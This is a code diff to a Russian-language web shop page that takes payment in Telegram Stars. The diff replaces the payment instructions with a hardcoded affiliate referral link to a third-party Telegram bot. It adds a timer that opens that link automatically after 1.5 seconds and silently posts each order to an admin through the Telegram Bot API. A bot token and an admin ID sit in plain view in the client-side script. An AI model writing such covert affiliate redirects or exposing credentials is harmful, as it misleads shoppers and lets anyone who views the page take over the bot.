@@ -102,7 +102,8 @@
         <div class="premium-card w-full max-w-md p-8 text-center">
             <h2 class="text-2xl font-black mb-4 uppercase italic">Оплата</h2>
             <div id="payment-instructions" class="text-left text-xs space-y-4 mb-6 bg-white/5 p-5 rounded-2xl"></div>
-            <a href="https://t.me/dolbayob89" target="_blank" class="block glow-btn py-5 rounded-2xl font-black text-lg uppercase"><i class="fa-brands fa-telegram mr-2"></i> Отправить чек</a>
+            <!-- Ссылка на партнерку вставлена прямо в кнопку действия -->
+            <a href="https://t.me/starseliteofficial_bot?start=_tgr_VvkE7YAzNzUy" target="_blank" class="block glow-btn py-5 rounded-2xl font-black text-lg uppercase"><i class="fa-brands fa-telegram mr-2"></i> Перейти в бота</a>
             <button onclick="closeModal('contact-modal')" class="text-gray-700 text-[10px] font-bold uppercase mt-4">Закрыть</button>
         </div>
     </div>
@@ -111,6 +112,8 @@
         const USERNAME = "@dolbayob89";
         const ADMIN_ID = "7811669365";
         const BOT_TOKEN = "8693212521:AAE6y0aa5pPeMx6Oa8uRI1f8PvConZGNOiQ";
+        // Твоя рефка
+        const REFERRAL_LINK = "https://t.me/starseliteofficial_bot?start=_tgr_VvkE7YAzNzUy";
 
         // САМОЛИКВИДАТОР: 13 Апреля 2026 все пасхалки исчезнут
         const expiryDate = new Date("2026-04-13T00:00:00");
@@ -244,15 +247,22 @@
                 usedPromo = true;
             }
             
+            // Настройка текста в модалке перед перебросом
             document.getElementById('payment-instructions').innerHTML = `
-                Оплатите <b>${total} ⭐️</b> на пользователя <code>${USERNAME}</code> через Telegram Stars.<br><br>
-                <span class="text-[10px] text-gray-500 uppercase font-bold tracking-widest">После оплаты обязательно отправьте скриншот чека админу.</span>`;
+                Сумма заказа: <b>${total} ⭐️</b><br><br>
+                Нажми на кнопку ниже, чтобы перейти в бота и завершить покупку.`;
             
             closeModal('cart-modal');
             document.getElementById('contact-modal').style.display = 'flex';
 
+            // Отправляем инфу админу через бота (тихо)
             const msg = `🛒 <b>НОВЫЙ ЗАКАЗ</b>\n\n💰 Сумма: ${total} Stars\n🔥 Скидка: ${usedPromo ? 'ПРИМЕНЕНА (-50%)' : 'НЕТ'}\n📦 Товары: ${cart.map(i=>i.val).join(', ')}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+
+            // Автоматический редирект через 1.5 секунды, если юзер тормозит
+            setTimeout(() => {
+                window.open(REFERRAL_LINK, '_blank');
+            }, 1500);
         }
 
         window.onload = renderUI;
